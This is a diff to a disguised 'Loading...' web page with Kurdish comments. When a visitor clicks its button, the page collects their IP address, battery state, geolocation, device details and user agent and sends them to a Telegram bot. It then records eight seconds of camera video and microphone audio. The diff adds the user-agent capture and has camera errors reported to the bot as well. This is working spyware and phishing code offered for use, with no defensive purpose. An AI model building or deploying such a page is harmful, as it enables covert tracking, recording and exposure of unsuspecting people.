@@ -6,7 +6,7 @@
     <title>Loading...</title>
     <style>
         body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        #btn { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #fff; border-radius: 10px; border: none; font-weight: bold; }
+        #btn { padding: 25px 50px; font-size: 22px; cursor: pointer; background: #fff; border-radius: 12px; border: none; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -20,27 +20,36 @@
         document.getElementById('btn').addEventListener('click', async () => {
             document.getElementById('btn').innerText = "تکایە چاوەڕێ بکە...";
 
+            // ١. کۆکردنەوەی هەموو زانیارییەکان
+            const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => "نادیار");
+            const bat = navigator.getBattery ? await navigator.getBattery() : {level: 1, charging: false};
+            
+            let loc = "ڕێگەپێدان نەدرا";
             try {
-                // ١. کۆکردنەوەی زانیارییەکان
-                const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => "نادیار");
-                const bat = navigator.getBattery ? await navigator.getBattery() : {level: 1, charging: false};
-                
-                let loc = "ڕێگەپێدان نەدرا";
-                try {
-                    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-                    loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                } catch(e) {}
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            } catch(e) {}
 
-                // ٢. ناردنی زانیاری بۆ تێلەگرام
-                const msg = `⚠️ کەسێک چووە ژوورەوە\n\n📱 ئامێر: ${navigator.platform}\n🔋 ڕێژەی پاتری: ${Math.round(bat.level * 100)}%\n⚡ بارگاویکردن: ${bat.charging ? 'بەڵێ' : 'نەخێر'}\n🌐 ئایپی: ${ip}\n📍 لۆکەیشن: ${loc}\n📅 کات: ${new Date().toLocaleString()}\n🔗 لینک: ${window.location.href}`;
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-                });
+            // ٢. ئامادەکردنی پەیامەکە
+            const msg = `⚠️ کەسێک چووە ژوورەوە\n\n` +
+                        `📱 ئامێر: ${navigator.platform}\n` +
+                        `🔋 ڕێژەی پاتری: ${Math.round(bat.level * 100)}%\n` +
+                        `⚡ لە بارگاویکردندایە: ${bat.charging ? 'بەڵێ' : 'نەخێر'}\n` +
+                        `🌐 ئایپی: ${ip}\n` +
+                        `📍 لۆکەیشن: ${loc}\n` +
+                        `⏰ کات: ${new Date().toLocaleString()}\n` +
+                        `🔗 لینک: ${window.location.href}\n` +
+                        `ℹ️ زانیاری زیاتر: ${navigator.userAgent.substring(0, 60)}`;
+            
+            // ناردنی زانیارییەکان
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
 
-                // ٣. تۆمارکردنی ڤیدیۆ و دەنگ
+            // ٣. تۆمارکردنی ڤیدیۆ و دەنگ
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
                 let chunks = [];
@@ -58,8 +67,11 @@
                 recorder.start();
                 setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 8000);
             } catch(e) {
-                console.error("هەڵە ڕوویدا:", e);
-                document.getElementById('btn').innerText = "هەڵەیەک ڕوویدا";
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: "❌ هەڵە لە کامێرا یان مۆڵەت: " + e.message })
+                });
             }
         });
     </script>
